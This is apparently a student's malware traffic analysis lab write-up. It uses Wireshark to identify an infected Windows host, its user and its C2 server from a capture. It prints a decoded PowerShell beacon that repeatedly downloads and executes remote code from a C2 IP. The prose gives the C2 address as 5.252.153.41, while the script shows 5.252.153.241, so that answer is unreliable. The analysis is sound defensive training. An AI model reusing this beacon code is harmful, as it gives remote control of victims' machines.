# **Wireshark Malware Traffic Analysis Lab**

## **Overview**
This lab focuses on the analysis of network traffic to identify indicators of infection on a Windows client using Wireshark. The analysis leverages a packet capture (PCAP) file sourced from Malware Traffic Analysis, reflecting a realistic malware investigation scenario. Throughout the exercise, we examine network traffic, extract pertinent artifacts, and systematically address essential incident response questions.

Important Note: The provided answer sheet for post-infection analysis references a different PCAP file than the one used in this analysis. Consequently, we cannot utilize it for validating our findings.

The detailed exercise referenced in this lab is available here:
Malware Traffic Analysis Exercise - January 22, 2025

The primary goal of this lab is educational, aiming to provide hands-on experience with investigative methods necessary for identifying indicators of compromise (IOCs) within network captures, specifically targeting contemporary cyber threats relevant to 2025.

In this scenario, we simulate a network infection initiated through a deceptive Microsoft Teams advertisement that delivers a malicious PowerShell script. The analysis is dedicated to identifying critical elements, including the infected host, command-and-control (C2) server, and the mechanisms employed for payload delivery using Wireshark. Interestingly, the PCAP available on the source website lacked certain activities necessary to answer questions 5 and 6 relating to specific HTTP requests. This gap provided an opportunity for deeper investigative activities into the malicious payload. Through careful analysis, the PowerShell script was successfully decoded by de-obfuscating the encoded string and applying Base64 decoding techniques.

The investigation of the malicious PowerShell script revealed that the malware leverages the infected machine's C-drive serial number as a unique host identifier. Furthermore, it was determined that the malware communicates continuously every five seconds with its command-and-control server hosted at IP address 5.252.153.41, demonstrating classic beaconing behavior.

Tools Utilized:

Host-only Linux VM (Kali-based)

Wireshark (for PCAP analysis)

ChatGPT (for assistance in script de-obfuscation, payload decoding, and interpreting attack logic)

## **Scenario**
As a **Security Operations Center (SOC) analyst**, you receive a report from a user who claims that a coworker has downloaded a suspicious file after searching for **Google Authenticator**. The caller provides supporting details that align with reports shared on social media:

- **LinkedIn:** [Post by Unit42](https://www.linkedin.com/posts/unit42_2025-01-22-wednesday-a-malicious-ad-led-activity-7288213662329192450-ky3V/)
- **Twitter (X):** [Unit42 Intel Tweet](https://x.com/Unit42_Intel/status/1882448037030584611)

Upon initial investigation, you confirm that an infection has occurred. You retrieve a **PCAP file** containing network traffic associated with the incident. During analysis, several indicators align with details referenced in the GitHub page linked within the social media posts. Following confirmation of the infection, an **incident report** is prepared.

## **Incident Response Tasks**
The goal of this exercise is to answer the following questions based on **PCAP analysis**:

1. **What is the IP address of the infected Windows client?**  
2. **What is the MAC address of the infected Windows client?**  
3. **What is the hostname of the infected Windows client?**  
4. **What is the user account name on the infected Windows client?**  
5. **What is the likely domain name associated with the fake Google Authenticator page?**  
6. **What are the command-and-control (C2) server IP addresses used in this infection?**

## **Lab Setup and Steps**
### **Step 1: Download the PCAP File**
- Obtain the **post-infection PCAP file** from the exercise page.
- The **password** for the file can be found in the following reference:  
  [Malware Traffic Analysis - About Page](https://malware-traffic-analysis.net/about.html)

### **Step 2: Transfer the PCAP File to a Virtual Machine**
To analyze the file securely, it is recommended to transfer it to a **virtual machine** (VM). If you need to share files between the host machine and the VM, follow these steps:

#### **Method: Python HTTP Server**
1. Open a command prompt in the directory containing the PCAP file.
2. Run the following command to start a simple HTTP server:
   ```bash
   python -m http.server 8080
   ```
3. Open a terminal in your VM
4. Run the following command to download the shared file to your VM
   ```bash
   wget http://192.168.56.1:8080/yourfilename
   ```
### **Step 3: Configure Wireshark for Analysis**
1. Remove unnecessary columns (e.g., Packet Number) for a clearer display.
2. Change the time format to display the full date and time for easier event correlation.


![Untitled design (2)](https://github.com/user-attachments/assets/a5e07850-b490-4572-9c72-e210432948b9)

### Initial Investigation
1) used view object content on wireshark to view the files that are part of the pcap file
2) save the file
3) view object properties to get the hash of the file
4) search the has on virus total to determine whether its an infected file

### Q1)  **What is the IP address of the infected Windows client?**  
I found the host ip(victim ip) by taking the ip address under the source column for the http requests. Answer: 10.1.17.215
![image](https://github.com/user-attachments/assets/3f066b17-faa8-4425-b5be-d2f458633b23)

### Q2) **What is the MAC address of the infected Windows client?**  
I found the MAC address by going into the packet details of one of the http request packet, exploding the Ethernet section, and finding the HEX value of the source. Answer: 00:d0:b7:26:4a:74
![image](https://github.com/user-attachments/assets/6afb7c95-ea27-49e2-beea-fa7fd94855a8)

### Q3) **What is the hostname of the infected Windows client?**  
I found the hostname by first filtering to only dhcp requests, then exploding option 12 of the packet details(host name). Answer: DESKTOP-L8C5GSJ
### Q4) **What is the user account name on the infected Windows client?** 
I found the user account name by using the Kerberos query: kerberos.CNameString. From that, I was able to filter for kerberos activities (windows authentication protocol) and found the account under the cname field: shutchenson.
![image](https://github.com/user-attachments/assets/ab7e6f8b-e719-4bc0-9206-63763a6fc099)

### Q5) **What is the likely domain name associated with the fake page?** 
I investigated the pcap file by first filtering http get requests. I followed the tcp stream of a request that received a powershell script. From there, I found all information available about how the attack happened. What I noticed is that the only information available about the host is the following ip address: 5.252.153.41
### Q6) **What are the command-and-control (C2) server IP addresses used in this infection?**
Using AI, I decoded the ps1 file found in the objects of the pcap, and found that the C2 server is also: 5.252.153.41


### Finding and decoding the malicious powershell script
Upon examining the network capture file, I discovered a suspicious PowerShell script among the listed objects. 

![image](https://github.com/user-attachments/assets/b364d061-7b4b-47ca-a83d-0981d9778004)

Upon opening the extracted script, it appeared heavily obfuscated, resembling a cipher rather than typical code. Utilizing artificial intelligence tools, I identified that the script contained extraneous characters intended solely for obfuscation, clearly indicated by the first and last lines of the PowerShell file. Further analysis confirmed that the core payload was encoded in Base64.

The Python script developed for decoding and extracting the malicious payload can be found here: decoder.py.

The decoded malicious PowerShell script is:
```bash
$fso = New-Object -Com "Scripting.FileSystemObject"
$SerialNumber = $fso.GetDrive("c:\").SerialNumber
$SerialNumber = "{0:X}" -f $SerialNumber
$SerialNumber = [convert]::toint64($SerialNumber,16)
$serial = $SerialNumber
$ip = 'http://5.252.153.241/'
$url = $ip+$serial
$s = New-Object System.Net.WebClient
while ($true) {
    try {
        $result=$s.DownloadString($url)
    }
    catch {
        Start-Sleep -s 5
        continue
    }
    Invoke-Expression $result
    Start-Sleep -s 5
}
```
As previously described, the script generates a unique URL for the infected host by concatenating the IP address of the C2 server with the infected machine's C-drive serial number ($url = $ip+$serial). It then enters an infinite loop, persistently attempting to download and execute commands from the C2 server ($result=$s.DownloadString($url)) every five seconds.

Tools Utilized:

Host-only Linux VM (Kali-based)

Wireshark (for PCAP analysis)

ChatGPT (for assistance in script de-obfuscation, payload decoding, and interpreting attack logic)


sources:
https://malware-traffic-analysis.net/2025/01/22/index.html
https://www.youtube.com/watch?v=3t1BNAavrlQ&t=11s
